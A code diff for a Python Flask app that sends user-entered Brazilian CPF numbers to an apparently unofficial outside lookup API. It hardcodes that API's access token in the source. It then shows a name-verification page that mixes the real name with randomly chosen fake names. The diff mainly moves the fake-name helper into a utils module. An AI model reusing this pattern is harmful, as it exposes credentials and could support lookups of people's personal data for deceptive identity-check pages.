@@ -77,6 +77,7 @@ with app.app_context():
         raise
 
 from services.cpf_service import CpfService
+from services.utils import gerar_nomes_falsos
 
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 cpf_service = CpfService(API_URL, "4da265ab-0452-4f87-86be-8d83a04a745a")
@@ -85,10 +86,10 @@ cpf_service = CpfService(API_URL, "4da265ab-0452-4f87-86be-8d83a04a745a")
 def consultar_cpf():
     cpf = request.form.get('cpf', '').strip()
     cpf_numerico = ''.join(filter(str.isdigit, cpf))
-    
+
     try:
         dados_api = cpf_service.consultar_cpf(cpf)
-        
+
         if not dados_api:
             flash('CPF não encontrado ou erro na consulta. Por favor, tente novamente.')
             return redirect(url_for('index'))
@@ -111,8 +112,8 @@ def consultar_cpf():
         session['dados_usuario'] = dados_usuario
 
         return render_template('verificar_nome.html',
-                          dados=dados_usuario,
-                          current_year=datetime.now().year)
+                              dados=dados_usuario,
+                              current_year=datetime.now().year)
 
     except requests.exceptions.Timeout:
         logger.error("Timeout ao consultar a API")
@@ -190,53 +191,6 @@ def get_client_ip() -> str:
         ip = request.remote_addr
     return ip
 
-def gerar_nomes_falsos(nome_real: str) -> list:
-    try:
-        nomes_base = [
-            "MARIA SILVA SANTOS",
-            "JOSE OLIVEIRA SOUZA",
-            "ANA PEREIRA LIMA",
-            "JOAO FERREIRA COSTA",
-            "ANTONIO RODRIGUES ALVES",
-            "FRANCISCO GOMES SILVA",
-            "CARLOS SANTOS OLIVEIRA",
-            "PAULO RIBEIRO MARTINS",
-            "PEDRO ALMEIDA COSTA",
-            "LUCAS CARVALHO LIMA"
-        ]
-        
-        # Garante que nome_real é uma string
-        nome_real = str(nome_real).upper()
-        palavras_nome_real = set(nome_real.split())
-        
-        # Seleciona dois nomes aleatórios diferentes do nome real
-        nomes_diferentes = []
-        nomes_base_copy = nomes_base.copy()
-        random.shuffle(nomes_base_copy)
-        
-        for nome in nomes_base_copy:
-            if len(nomes_diferentes) >= 2:
-                break
-            palavras_nome = set(nome.split())
-            if not palavras_nome.intersection(palavras_nome_real):
-                nomes_diferentes.append(nome)
-        
-        # Se não encontrou nomes diferentes suficientes
-        while len(nomes_diferentes) < 2:
-            if not nomes_base_copy:
-                nomes_diferentes.append("MARIA OLIVEIRA SANTOS")
-            else:
-                nomes_diferentes.append(nomes_base_copy.pop(0))
-        
-        # Cria lista final limitada a 3 nomes
-        todos_nomes = nomes_diferentes[:2] + [nome_real]
-        random.shuffle(todos_nomes)
-        return todos_nomes[:3]
-    except Exception as e:
-        logger.error(f"Erro ao gerar nomes falsos: {str(e)}")
-        return ["MARIA OLIVEIRA SANTOS", "JOSE SILVA COSTA", str(nome_real).upper()]
-
-# Função auxiliar para gerar datas falsas
 def gerar_datas_falsas(data_real_str: str) -> List[str]:
     data_real = datetime.strptime(data_real_str.split()[0], '%Y-%m-%d')
     datas_falsas = []
